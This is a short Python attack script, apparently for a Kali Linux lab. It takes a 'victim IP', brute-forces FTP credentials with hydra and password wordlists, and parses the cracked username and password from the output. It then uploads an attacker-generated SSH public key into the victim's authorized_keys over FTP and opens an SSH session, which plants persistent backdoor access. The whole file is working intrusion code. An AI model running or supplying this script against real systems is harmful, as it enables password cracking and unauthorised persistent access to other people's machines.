import os
import ftplib

entry = input("Enter victim IP: ")
os.system("rm /home/kali/.ssh/*")
os.system("ssh-keygen -t rsa -N '' -f /home/kali/.ssh/id_rsa")
os.system("mv /home/kali/.ssh/id_rsa.pub /home/kali/.ssh/authorized_keys")
os.system("hydra -L /usr/share/wordlists/users.txt -P /usr/share/wordlists/smallrockyou.txt 172.20.13.57 ftp -F -o /home/kali/hydradic/crackedpassword/password.txt -V")

with open('/home/kali/hydradic/crackedpassword/password.txt', 'r') as f:
   loginInfo = f.readlines()

username = str(loginInfo)
username = username.split()
username = username[24]

password = str(loginInfo)
password = password.split()
password = password[26][:-4]

print("Username: " + username + "\nPassword: " + password)

server = entry
session = ftplib.FTP(server, username, password)
myPath = '/home/'+username+'/.ssh/authorized_keys'

file = open('/home/kali/.ssh/authorized_keys', 'rb')
session.storbinary('STOR '+ myPath, fp=file)
file.close()
session.quit()

os.system('ssh -o "StrictHostKeyChecking no" -i /home/kali/.ssh/id_rsa ' + username + "@" + entry)
